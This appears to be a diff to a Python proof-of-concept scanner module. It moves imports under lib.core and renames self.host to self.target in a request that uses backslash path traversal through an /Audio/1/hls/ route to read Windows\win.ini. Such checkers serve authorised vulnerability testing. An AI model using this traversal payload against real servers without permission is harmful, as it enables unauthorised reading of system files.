@@ -5,8 +5,8 @@ import sys
 # ...
 urllib3.disable_warnings()
 # sys.path.append(root_path)
-from lib.common import url_handle,get_random_ua
-from lib.poc import POCBase
+from lib.core.common import url_handle,get_random_ua
+from lib.core.poc import POCBase
 
 
 
@@ -51,7 +51,7 @@ class POC(POCBase):
         # global vul_list
         # vul_list[1] = sys._getframe().f_code.co_name#获取当前函数名
         vuln = [False,""]
-        url = self.host + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"
+        url = self.target + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"
 
 
         headers = {"User-Agent":get_random_ua(),
